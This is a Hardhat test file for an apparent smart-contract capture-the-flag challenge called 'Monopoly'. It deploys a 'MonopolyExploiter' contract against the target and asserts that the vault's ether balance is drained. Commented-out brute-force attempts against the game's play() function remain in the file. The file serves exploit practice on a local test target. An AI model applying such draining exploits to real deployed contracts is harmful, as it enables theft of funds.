const { expect } = require("chai");
const { ethers, jsonRpcProvider } = require("hardhat");
require("dotenv").config()


const {PVT_KEY} = process.env

describe("Monopoly", function () {
  let deployer, attacker ;
  before(async function(){
    [deployer, attacker] = await ethers.getSigners()

    const MonopolyFactory = await hre.ethers.getContractFactory("Monopoly", deployer)
    this.monopoly = await MonopolyFactory.deploy({value: ethers.utils.parseEther("0.01")})
    await this.monopoly.deployed()

    this.vaultAddress = await this.monopoly.vault()
    expect(await ethers.provider.getBalance(this.vaultAddress)).to.eq(ethers.utils.parseEther("0.01"))
    
  })
  it("exploit", async function () {

    // const wallet = new ethers.Wallet(PVT_KEY)
    // const signer = ethers.getSigner(wallet)
    // const jsonRpcProvider = await new ethers.providers.JsonRpcProvider()
    // const signer = await jsonRpcProvider.getSigner("0xa2bb722f87660C0F080A77ad2E830e830495162D")
    // console.log(signer)
    // const monopolyAttacker = await this.monopoly.connect(signer) 
    // const signer =  await this.monopoly.provider.getSigner("0xa2bb722f87660C0F080A77ad2E830e830495162D")
    // // const monopoly = await this.monopoly.connect(monopolyAttacker) 
    // // console.log(monopolyAttacker)
    // await monopolyAttacker.play(1,2)

    // const monopolyAttacker = await this.monopoly.connect(signer)

    // const random = () =>  Math.floor(Math.random()*(4294967295-0+1)+0);
    const randomInt = (max, min) => Math.round(Math.random() * (max - min)) + min;

    let first;
    let second;
    let lastNum;

    //bruteforcing
    // for(i=0;i <5000000; i++){
    //   try {
    //     first = randomInt(0, 2000000)
    //     second = randomInt(0, 2000000)
    //     await this.monopoly.play(first,second)
    //     lastNum = i
    //     break
    //   } catch(er) {
    //     // console.log(er)
    //   }
    // }
    // console.log("lastNum", lastNum)
    // console.log("first", first)
    // console.log("second", second)

    // first = 2 ^ 15
    // await this.monopoly.play(first, second)

    const ExploitFactory = await hre.ethers.getContractFactory("MonopolyExploiter")
    const exploit = await ExploitFactory.deploy(this.monopoly.address, "0xa2bb722f87660C0F080A77ad2E830e830495162D")
    await exploit.deployed()

  });
  after(async function() {
    expect(await ethers.provider.getBalance(this.vaultAddress)).to.eq(0)
  })
});
